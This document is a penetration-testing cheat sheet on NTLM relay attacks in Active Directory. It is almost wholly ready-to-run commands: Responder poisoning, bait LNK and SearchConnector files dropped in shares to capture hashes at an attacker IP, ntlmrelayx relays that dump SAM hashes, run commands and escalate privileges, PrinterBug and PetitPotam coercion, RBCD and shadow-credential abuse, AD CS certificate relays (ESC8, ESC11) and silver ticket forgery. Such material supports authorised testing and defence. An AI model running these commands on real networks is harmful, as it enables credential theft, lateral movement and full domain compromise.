## Enumeration

Identify hosts without SMB signing (relay targets) and map the attack surface before launching relay attacks.

### Responder - Analyze Mode (No Poisoning)

Observe LLMNR/NBT-NS/MDNS traffic without responding to it.

```bash
python3 Responder.py -I ens192 -A
```

### Responder - Poisoning Mode (Active)

```bash
python3 Responder.py -I ens192
```

### RunFinger - Find Hosts Without SMB Signing

```bash
python3 RunFinger.py -i <subnet>
```

### CrackMapExec - Generate Relay Target List

```bash
crackmapexec smb <subnet> --gen-relay-list relayTargets.txt
```

### Enumerate Shares Anonymously

```bash
crackmapexec smb <subnet> -u anonymous -p '' --shares
```

### Enumerate WebDAV Servers

```bash
crackmapexec smb <subnet> -u <username> -p <password> -M webdav
```

---

## Farming NTLMv2 Hashes

Techniques to place malicious files in writable shares that trigger hash capture when opened.

### NTLM Theft - Generate All File Types

Creates various file types (SCF, LNK, URL, etc.) that trigger authentication to your server when opened.

```bash
python3 ntlm_theft.py -g all -s <attacker-ip> -f '@myfile'
```

### CME - Drop LNK File in Share

```bash
crackmapexec smb <target-ip> -u anonymous -p '' -M slinky -o SERVER=<attacker-ip> NAME=important
```

### CME - Drop SearchConnector File

```bash
crackmapexec smb <target-ip> -u anonymous -p '' -M drop-sc -o URL=https://<attacker-ip>/testing SHARE=smb FILENAME=@secret
```

---

## NTLMRelayx

Forward captured NTLM authentications to attack targets. Run alongside Responder (with SMB/HTTP disabled in Responder config).

### Default Relay (SAM Dump)

Relays to all targets in the list and attempts to dump local SAM hashes.

```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support
```

### Execute Command on Target

```bash
ntlmrelayx.py -t <target-ip> -smb2support -c "whoami"
```

### Target-Specific Relay

```bash
ntlmrelayx.py -t smb://<target-ip>
ntlmrelayx.py -t mssql://<target-ip>
ntlmrelayx.py -t ldap://<target-ip>
ntlmrelayx.py -t all://<target-ip>
ntlmrelayx.py -t smb://<DOMAIN>\\<username>@<target-ip>
```

### SOCKS Mode (Keep Connections Alive)

Maintains SOCKS connections through the relay for interactive use with proxychains.

```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
```

### Interactive SMB Shell

```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support -i
```

### MSSQL Query Execution

```bash
ntlmrelayx.py -t mssql://<DOMAIN>\\<username>@<sql-server-ip> -smb2support -q "SELECT name FROM sys.databases;"
```

### LDAP - Domain Enumeration

Dumps domain user and group information via LDAP relay.

```bash
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --no-da --no-acl --lootdir ldap_dump
```

### LDAP - Create Computer Account

Creates a machine account via LDAP relay for use in further attacks.

```bash
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --no-da --no-acl --add-computer 'plaintext$'
```

### LDAP - Privilege Escalation via ACL Abuse

Modifies DACL to escalate the specified user's privileges.

```bash
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --escalate-user 'plaintext$' --no-dump -debug
```

---

## Coerce Authentication

Force a target machine to authenticate to you over SMB/HTTP. Combine with a relay listener or Responder.

### PrinterBug (MS-RPRN)

```bash
python3 printerbug.py <domain>/plaintext$:'<password>'@<target-ip> <attacker-ip>
```

### PetitPotam (MS-EFSR)

```bash
python3 PetitPotam.py <attacker-ip> <target-ip> -u 'plaintext$' -p '<password>' -d <domain>
```

### DFSCoerce (MS-DFSNM)

```bash
python3 dfscoerce.py -u 'plaintext$' -p '<password>' <attacker-ip> <target-ip>
```

### Coercer (All Methods)

```bash
Coercer scan -t <target-ip> -u 'plaintext$' -p '<password>' -d <domain> -v
Coercer coerce -t <target-ip> -l <attacker-ip> -u 'plaintext$' -p '<password>' -d <domain> -v --always-continue
```

---

## Kerberos RBCD Abuse via Relay

Relay NTLM auth to LDAPS to configure Resource-Based Constrained Delegation on the target, then impersonate Administrator.

### Configure RBCD via LDAPS Relay

```bash
ntlmrelayx.py -t ldaps://<DOMAIN>\\<target-machine>$@<dc-ip> --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump
```

### Generate Service Ticket as Administrator

```bash
getST.py -spn cifs/<target>.<domain> -impersonate Administrator -dc-ip <dc-ip> "<DOMAIN>"/"plaintext$":"<password>"
```

### Use Ticket to Connect

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <target>.<domain>
```

---

## Shadow Credentials via Relay

Relay to LDAP and modify the `msDS-KeyCredentialLink` attribute of the target account.

### Execute Shadow Credentials Attack

```bash
ntlmrelayx.py -t ldap://<DOMAIN>\\<source-account>@<dc-ip> --shadow-credentials --shadow-target <target-user> --no-da --no-dump --no-acl
```

### Use Certificate to Get TGT

```bash
python3 gettgtpkinit.py -cert-pfx <pfx-file> -pfx-pass <pfx-password> <DOMAIN>/<target-user> <target-user>.ccache
KRB5CCNAME=<target-user>.ccache evil-winrm -i <dc-hostname>.<domain> -r <DOMAIN>
```

---

## ESC8 - NTLM Relay to AD CS (Web Enrollment)

Relay machine account NTLM auth to the CA's web enrollment endpoint to obtain a machine certificate.

### Enumerate AD CS

```bash
crackmapexec ldap <subnet> -u '<username>' -p '<password>' -M adcs
crackmapexec ldap <dc-ip> -u <username> -p '<password>' -M adcs -o SERVER=<CA-name>
certipy find -enabled -u '<username>'@<dc-ip> -p '<password>' -stdout
```

### Setup Relay to CA Web Enrollment

```bash
ntlmrelayx.py -t http://<ca-ip>/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

### Coerce Machine Authentication

```bash
python3 printerbug.py <domain>/plaintext$:'<password>'@<target-ip> <attacker-ip>
```

### Use Certificate to Get TGT

```bash
echo -n "<base64-cert>" | base64 -d > ws01.pfx
python3 gettgtpkinit.py -dc-ip <dc-ip> -cert-pfx ws01.pfx '<DOMAIN>/<machine>$' ws01.ccache
KRB5CCNAME=ws01.ccache python3 getnthash.py '<DOMAIN>/<machine>$' -key <session-key>
```

---

## ESC11 - NTLM Relay to RPC (Certipy)

Relay to the CA's RPC endpoint instead of HTTP.

```bash
certipy relay -target "http://<ca-ip>" -template Machine
# Coerce auth (printerbug, petitpotam, etc.)
certipy auth -pfx ws01.pfx -dc-ip <dc-ip>
certipy relay -target "rpc://<dc-ip>" -ca "<CA-name>"
```

---

## Create Silver Ticket from Machine Hash

After recovering a machine account hash, forge a silver ticket for CIFS access without domain contact.

### Get Domain SID

```bash
lookupsid.py '<DOMAIN>/<machine>$'@<dc-ip> -hashes :<machine-hash>
```

### Forge Silver Ticket

```bash
ticketer.py -nthash <machine-hash> -domain-sid <domain-sid> -domain <domain> -spn cifs/<target>.<domain> Administrator
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <target>.<domain>
```
